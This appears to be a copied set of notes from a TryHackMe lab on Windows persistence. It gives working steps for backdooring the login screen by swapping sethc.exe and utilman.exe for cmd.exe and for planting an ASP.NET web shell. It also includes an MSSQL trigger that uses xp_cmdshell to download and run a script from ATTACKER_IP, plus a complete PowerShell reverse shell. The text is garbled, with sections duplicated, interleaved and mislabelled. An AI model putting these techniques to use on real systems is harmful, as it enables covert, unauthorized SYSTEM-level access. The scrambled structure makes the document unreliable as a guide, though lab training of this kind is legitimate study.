# Windows Persistence

## Sticky Keys

* To establish persistence using Sticky Keys, we will abuse a shortcut enabled by default in any Windows installation that allows us to activate Sticky Keys by pressing SHIFT 5 times.
* After inputting the shortcut, we should usually be presented with a screen that looks as follows:
* <img src="https://user-images.githubusercontent.com/75596877/181267438-2b171902-fbbe-4bb9-b08e-7c3c69e40795.png" alt="27e711818bea549ace3cf85279f339c8" data-size="original">
* After pressing SHIFT 5 times, Windows will execute the binary in `C:\Windows\System32\sethc.exe`.
* If we are able to replace such binary for a payload of our preference, we can then trigger it with the shortcut. Interestingly, we can even do this from the login screen before inputting any credentials.
* A straightforward way to backdoor the login screen consists of replacing `sethc.exe` with a copy of `cmd.exe`.
* That way, we can spawn a console using the sticky keys shortcut, even from the logging screen.
* To overwrite `sethc.exe`, we first need to take ownership of the file and grant our current user permission to modify it.
* Only then will we be able to replace it with a copy of `cmd.exe`. We can do so with the following commands:

```
takeown /f c:\Windows\System32\sethc.exe

SUCCESS: The file (or folder): "c:\Windows\System32\sethc.exe" now owned by user "PURECHAOS\Administrator".

icacls C:\Windows\System32\sethc.exe /grant Administrator:F
processed file: C:\Windows\System32\sethc.exe
Successfully processed 1 files; Failed processing 0 files

copy c:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
Overwrite C:\Windows\System32\sethc.exe? (Yes/No/All): yes
        1 file(s) copied.
```

* After doing so, lock your session from the start menu:
* You should now be able to press SHIFT five times to access a terminal with SYSTEM privileges directly from the login screen:

![](https://user-images.githubusercontent.com/75596877/181267037-094a49f2-7a4c-4a80-bee8-2a1ea8e14c52.png)

## Utilman

* Notice that this registry key has no equivalent in HKLM, making your backdoor apply to the current user only.
* After doing this, sign out of your current session and log in again, and you should receive a shell (it will probably take around 10 seconds).
* Utilman is a built-in Windows application used to provide Ease of Access options during the lock screen:
* When we click the ease of access button on the login screen, it executes `C:\Windows\System32\Utilman.exe` with `SYSTEM` privileges. If we replace it with a copy of `cmd.exe`, we can bypass the login screen again.
* To replace `utilman.exe`, we do a similar process to what we did with `sethc.exe`:

### Sticky Keys

```
takeown /f c:\Windows\System32\utilman.exe
icacls C:\Windows\System32\utilman.exe /grant Administrator:F
copy c:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
```

* To establish persistence using Sticky Keys, we will abuse a shortcut enabled by default in any Windows installation that allows us to activate Sticky Keys by pressing SHIFT 5 times.
* After inputting the shortcut, we should usually be presented with a screen that looks as follows:

![](https://user-images.githubusercontent.com/75596877/181267438-2b171902-fbbe-4bb9-b08e-7c3c69e40795.png)

* To trigger our terminal, we will lock our screen from the start button:
* And finally, proceed to click on the "Ease of Access" button.

## Using Web Shells

* After pressing SHIFT 5 times, Windows will execute the binary in `C:\Windows\System32\sethc.exe`.
* If we are able to replace such binary for a payload of our preference, we can then trigger it with the shortcut. Interestingly, we can even do this from the login screen before inputting any credentials.
* A straightforward way to backdoor the login screen consists of replacing `sethc.exe` with a copy of `cmd.exe`.
* That way, we can spawn a console using the sticky keys shortcut, even from the logging screen.
* To overwrite `sethc.exe`, we first need to take ownership of the file and grant our current user permission to modify it.
* Only then will we be able to replace it with a copy of `cmd.exe`. We can do so with the following commands:
* If you notice the compromised target is hosting a web server, we can take advantage of this.
* Download A ASP.NET web shell.
* https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmdasp.aspx
* Transfer it to the victim machine and move it into the webroot, which by default is located in the `C:\inetpub\wwwroot` directory:

```
takeown /f c:\Windows\System32\sethc.exe

SUCCESS: The file (or folder): "c:\Windows\System32\sethc.exe" now owned by user "PURECHAOS\Administrator".

icacls C:\Windows\System32\sethc.exe /grant Administrator:F
processed file: C:\Windows\System32\sethc.exe
Successfully processed 1 files; Failed processing 0 files

copy c:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
Overwrite C:\Windows\System32\sethc.exe? (Yes/No/All): yes
        1 file(s) copied.
```

```
move shell.aspx C:\inetpub\wwwroot\
```

* After doing so, lock your session from the start menu:
* You should now be able to press SHIFT five times to access a terminal with SYSTEM privileges directly from the login screen:
* We can then run commands from the web server by pointing to the following URL:
* `http://MACHINE_IP/shell.aspx`

### Utilman

## Using MSSQL as a Backdoor

* Utilman is a built-in Windows application used to provide Ease of Access options during the lock screen:
* When we click the ease of access button on the login screen, it executes `C:\Windows\System32\Utilman.exe` with `SYSTEM` privileges. If we replace it with a copy of `cmd.exe`, we can bypass the login screen again.
* To replace `utilman.exe`, we do a similar process to what we did with `sethc.exe`:
* Simply put, triggers in MSSQL allow you to bind actions to be performed when specific events occur in the database. Those events can range from a user logging in up to data being inserted, updated or deleted from a given table. For this task, we will create a trigger for any `INSERT` into the `HRDB` database.
* Before creating the trigger, we must first reconfigure a few things on the database.
* First, we need to enable the `xp_cmdshell` stored procedure. `xp_cmdshell` is a stored procedure that is provided by default in any MSSQL installation and allows you to run commands directly in the system's console but comes **disabled by default.**
* To enable it, let's open `Microsoft SQL Server Management Studio 18`, available from the start menu.
* By default, the local Administrator account will have access to all DBs.
* Once logged in, click on the New Query button to open the query editor:
* Run the following SQL sentences to enable the "`Advanced Options`" in the MSSQL configuration, and proceed to enable `xp_cmdshell`.

```
takeown /f c:\Windows\System32\utilman.exe
icacls C:\Windows\System32\utilman.exe /grant Administrator:F
copy c:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
```

```
sp_configure 'Show Advanced Options',1;
RECONFIGURE;
GO

sp_configure 'xp_cmdshell',1;
RECONFIGURE;
GO
```

* To trigger our terminal, we will lock our screen from the start button:
* And finally, proceed to click on the "Ease of Access" button.
* After this, we must ensure that any website accessing the database can run `xp_cmdshell`.
* By default, only database users with the `sysadmin role` will be able to do so.
* Since it is expected that web applications use a restricted database user, we can grant privileges to all users to impersonate the `sa user`, which is the default database administrator:

### Using Web Shells

```
USE master

GRANT IMPERSONATE ON LOGIN::sa to [Public];
```

* If you notice the compromised target is hosting a web server, we can take advantage of this.
* Download A ASP.NET web shell.
* [https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmdasp.aspx](https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmdasp.aspx)
* Transfer it to the victim machine and move it into the webroot, which by default is located in the `C:\inetpub\wwwroot` directory:
* After all of this, we finally configure a trigger. We start by changing to the `HRDB` database:

```
move shell.aspx C:\inetpub\wwwroot\
```

```
USE HRDB
```

* We can then run commands from the web server by pointing to the following URL:
* `http://MACHINE_IP/shell.aspx`
* Our trigger will leverage `xp_cmdshell` to execute `Powershell` to download and run a `.ps1` file from a web server controlled by the attacker. The trigger will be configured to execute whenever an `INSERT` is made into the `Employees table` of the `HRDB database`:

### Using MSSQL as a Backdoor

```
CREATE TRIGGER [sql_backdoor]
ON HRDB.dbo.Employees 
FOR INSERT AS

EXECUTE AS LOGIN = 'sa'
EXEC master..xp_cmdshell 'Powershell -c "IEX(New-Object net.webclient).downloadstring(''http://ATTACKER_IP:8000/evilscript.ps1'')"';
```

* Simply put, triggers in MSSQL allow you to bind actions to be performed when specific events occur in the database. Those events can range from a user logging in up to data being inserted, updated or deleted from a given table. For this task, we will create a trigger for any `INSERT` into the `HRDB` database.
* Before creating the trigger, we must first reconfigure a few things on the database.
* First, we need to enable the `xp_cmdshell` stored procedure. `xp_cmdshell` is a stored procedure that is provided by default in any MSSQL installation and allows you to run commands directly in the system's console but comes **disabled by default.**
* To enable it, let's open `Microsoft SQL Server Management Studio 18`, available from the start menu.
* By default, the local Administrator account will have access to all DBs.
* Once logged in, click on the New Query button to open the query editor:
* Run the following SQL sentences to enable the "`Advanced Options`" in the MSSQL configuration, and proceed to enable `xp_cmdshell`.
* Now that the backdoor is set up, let's create `evilscript.ps1` in our attacker's machine, which will contain a Powershell reverse shell:

```
sp_configure 'Show Advanced Options',1;
RECONFIGURE;
GO

sp_configure 'xp_cmdshell',1;
RECONFIGURE;
GO
```

* After this, we must ensure that any website accessing the database can run `xp_cmdshell`.
* By default, only database users with the `sysadmin role` will be able to do so.
* Since it is expected that web applications use a restricted database user, we can grant privileges to all users to impersonate the `sa user`, which is the default database administrator:

```
USE master

GRANT IMPERSONATE ON LOGIN::sa to [Public];
```

* After all of this, we finally configure a trigger. We start by changing to the `HRDB` database:

```
$client = New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",4454);

$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};

$client.Close()
```

* We will need to open two terminals to handle the connections involved in this exploit:
* The trigger will perform the first connection to download and execute `evilscript.ps1`. Our trigger is using port `8000` for that.
* The second connection will be a reverse shell on port `4454` back to our attacker machine.

```
# AttackBox
python3 -m http.server 
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ... 
 	
# AttackBox
nc -lvp 4454
Listening on 0.0.0.0 4454
```

* With all that ready, let's navigate to `http://MACHINE_IP/` and `insert` an employee into the web application.
* Since the web application will send an `INSERT` statement to the database, our `TRIGGER` will provide us access to the system's console.

```
USE HRDB
```

* Our trigger will leverage `xp_cmdshell` to execute `Powershell` to download and run a `.ps1` file from a web server controlled by the attacker. The trigger will be configured to execute whenever an `INSERT` is made into the `Employees table` of the `HRDB database`:

```
CREATE TRIGGER [sql_backdoor]
ON HRDB.dbo.Employees 
FOR INSERT AS

EXECUTE AS LOGIN = 'sa'
EXEC master..xp_cmdshell 'Powershell -c "IEX(New-Object net.webclient).downloadstring(''http://ATTACKER_IP:8000/evilscript.ps1'')"';
```

* Now that the backdoor is set up, let's create `evilscript.ps1` in our attacker's machine, which will contain a Powershell reverse shell:

```
$client = New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",4454);

$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};

$client.Close()
```

* We will need to open two terminals to handle the connections involved in this exploit:
* The trigger will perform the first connection to download and execute `evilscript.ps1`. Our trigger is using port `8000` for that.
* The second connection will be a reverse shell on port `4454` back to our attacker machine.

```
# AttackBox
python3 -m http.server 
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ... 
 	
# AttackBox
nc -lvp 4454
Listening on 0.0.0.0 4454
```

* With all that ready, let's navigate to `http://MACHINE_IP/` and `insert` an employee into the web application.
* Since the web application will send an `INSERT` statement to the database, our `TRIGGER` will provide us access to the system's console.

#### Credit:

All credit to the content of this page goes to the original author

* [https://tryhackme.com/room/windowslocalpersistence](https://tryhackme.com/room/windowslocalpersistence)
* [https://tryhackme.com/p/munra](https://tryhackme.com/p/munra)
* [https://tryhackme.com/p/tryhackme](https://tryhackme.com/p/tryhackme)
